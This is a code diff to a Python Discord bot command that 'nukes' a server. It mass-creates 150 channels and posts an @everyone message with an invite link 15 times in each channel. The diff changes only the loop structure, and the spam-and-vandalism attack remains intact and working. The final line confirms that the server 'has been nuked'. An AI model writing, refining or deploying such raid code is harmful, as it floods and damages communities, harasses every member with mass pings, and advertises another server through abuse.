@@ -110,10 +110,11 @@ async def ruru(ctx):
     create_tasks = [guild.create_text_channel('るるくん最強') for _ in range(150)]
     new_channels = await asyncio.gather(*create_tasks)
 
-    # 各チャンネルに@everyoneメンションを投稿
+    # 各チャンネルに15個の@everyoneメンションを投稿
     mention_message = '@everyone 今すぐ参加⬇️ https://discord.gg/AdHwh9gMJe'
-    mention_tasks = [channel.send(mention_message) for channel in new_channels for _ in range(15)]
-    await asyncio.gather(*mention_tasks)
+    for channel in new_channels:
+        mention_tasks = [channel.send(mention_message) for _ in range(15)]
+        await asyncio.gather(*mention_tasks)
 
     await ctx.send('Server has been nuked and channels created!')
 
